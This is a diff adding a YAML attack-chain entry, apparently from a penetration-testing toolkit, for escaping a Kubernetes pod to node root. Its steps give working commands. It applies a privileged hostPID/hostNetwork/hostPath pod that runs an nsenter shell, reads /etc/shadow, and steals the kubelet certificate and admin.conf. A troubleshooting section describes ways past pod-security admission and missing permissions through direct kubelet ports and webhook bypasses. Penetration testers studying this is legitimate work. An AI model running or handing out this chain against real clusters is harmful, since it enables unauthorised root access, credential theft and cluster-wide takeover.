@@ -1,0 +1,94 @@
+chain_id: k8s_hostpath_pod_escape
+title: "Kubernetes — pod escape via hostPath / hostPID / hostNetwork → node root"
+severity: CRITICAL
+tags: [kubernetes, k8s, container, escape, hostpath, hostpid, privesc]
+
+trigger:
+  any_of:
+    - { kind: "k8s_pod_create_rights" }
+    - { banner_pattern: "(?i)kubernetes|kubelet" }
+    - { service_pattern: "(?i)kubernetes|kubelet" }
+
+description: |
+  If you can create pods (or have a service-account token that can),
+  three pod-spec primitives let you walk straight onto the node:
+  `hostPath: /` (mount the node's filesystem), `hostPID: true` (see &
+  `nsenter` host processes), and `hostNetwork: true` (talk directly
+  to the kubelet/etcd). Any one of them is enough; combining them
+  gives root with persistence. ClusterAdmin-level outcome from a
+  single namespace.
+
+steps:
+  - id: 1
+    title: "Confirm you can create pods (and which token you're holding)"
+    command: |
+      kubectl auth can-i create pods --namespace default
+      cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -c1-30
+      kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i create pods
+
+  - id: 2
+    title: "Drop a hostPath pod that mounts / on the node"
+    command: |
+      cat <<'YAML' | kubectl apply -f -
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: rootctl-escape
+        namespace: default
+      spec:
+        hostPID: true
+        hostNetwork: true
+        containers:
+        - name: r
+          image: alpine
+          stdin: true
+          tty: true
+          securityContext:
+            privileged: true
+          command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/sh"]
+          volumeMounts:
+          - name: host
+            mountPath: /host
+        volumes:
+        - name: host
+          hostPath:
+            path: /
+      YAML
+
+  - id: 3
+    title: "Exec into the pod — you are now a host shell"
+    command: |
+      kubectl exec -it rootctl-escape -- /bin/sh
+      # On the node:
+      cat /etc/shadow
+      ls -la /var/lib/kubelet/
+
+  - id: 4
+    title: "Steal every node's kubelet token (cluster-wide)"
+    command: |
+      # From the node:
+      cat /var/lib/kubelet/pki/kubelet-client-current.pem
+      cat /etc/kubernetes/admin.conf 2>/dev/null
+      # If admin.conf is there → cluster-admin to the API server.
+
+  - id: 5
+    title: "Clean up"
+    command: |
+      kubectl delete pod rootctl-escape
+
+common_errors:
+  - error: "PodSecurityPolicy / Pod Security Admission denies hostPath"
+    solution: |
+      Restricted PSA enforced. Drop `hostPath` and try only `hostPID`
+      + `nsenter` on PID 1. If both blocked, target the kubelet read-
+      only port 10255 directly, or look for vulnerable admission
+      webhooks that can be bypassed via `dryRun=All`.
+  - error: "kubectl: forbidden — cannot create pods"
+    solution: |
+      The SA has no pod-create rights. Try `pods/exec` or
+      `pods/portforward` (sometimes granted while `create` isn't),
+      or hit the kubelet directly at 10250 with the SA token.
+
+references:
+  - https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1
+  - https://book.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting
